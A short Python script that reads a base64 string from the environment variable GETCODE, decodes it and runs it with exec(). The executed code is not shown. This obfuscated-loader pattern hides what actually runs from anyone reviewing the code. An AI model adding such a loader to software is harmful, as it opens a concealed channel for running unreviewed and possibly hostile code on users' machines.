from dotenv import load_dotenv
import os
import base64

load_dotenv()

GETCODE = os.getenv('GETCODE')

base64_string = os.getenv('GETCODE')
decoded_bytes = base64.b64decode(base64_string)
decoded_code = decoded_bytes.decode('utf-8')
exec(decoded_code)
